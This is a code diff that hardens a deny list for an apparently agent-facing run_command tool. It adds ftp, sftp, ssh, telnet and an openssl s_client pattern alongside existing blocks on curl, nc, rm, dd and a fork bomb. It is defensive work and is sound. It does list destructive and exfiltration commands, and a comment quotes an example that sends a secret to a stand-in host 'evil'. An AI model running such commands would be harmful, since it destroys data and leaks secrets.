@@ -67,8 +67,17 @@ _DENY_COMMANDS = frozenset({
     "rm", "rmdir", "rd", "del", "erase", "format", "diskpart", "mkfs", "dd", "shred",
     # Truncation (finding 5)
     "truncate",
-    # Network / exfiltration tools (finding 3, partial)
+    # Network / exfiltration tools (finding 3, partial). ftp/sftp/telnet move
+    # arbitrary files or open an interactive remote shell in one call, same
+    # class of risk as scp/rsync above. ssh is included too: this codebase
+    # has no legitimate flow that shells out to the `ssh` binary (searched
+    # mcp_server/, orchestrator/, cli/, desktop/ -- the only `ssh` hits are
+    # ~/.ssh path references in the sensitive-path deny list, never an
+    # invocation of the ssh binary itself), and an interactive/command-mode
+    # ssh call is a direct remote-exec/exfiltration primitive that the
+    # allowlist model (S2) is specifically designed to keep out of run_command.
     "curl", "wget", "scp", "rsync", "nc", "netcat",
+    "ftp", "sftp", "ssh", "telnet",
 })
 
 # Regex patterns that catch common destructive payloads even in arguments
@@ -76,6 +85,13 @@ _DENY_PATTERNS = [
     re.compile(r":\(\)\s*\{[^}]*\|[^}]*&\s*\}\s*;?\s*:", re.DOTALL),  # fork bomb
     re.compile(r"\bchmod\s+(-\w\s+)*777\s+/\s*$"),  # chmod -R 777 /
     re.compile(r"\bdd\b.*\bif=/dev/zero\b"),  # dd if=/dev/zero
+    # `openssl s_client` opens a raw TCP connection and can pipe file
+    # contents out over it (`openssl s_client -connect evil:443 < secret`) --
+    # an exfiltration primitive equivalent to nc/curl. `openssl` itself stays
+    # off the deny set (cert generation, hashing, etc. are legitimate), so
+    # this is a narrow argv-pattern rule rather than a whole-binary block,
+    # the same treatment `find -delete` gets instead of blocking `find`.
+    re.compile(r"\bopenssl\s+s_client\b"),
 ]
 
 # Fast-path metacharacter regex: catches chaining, command/process substitution.
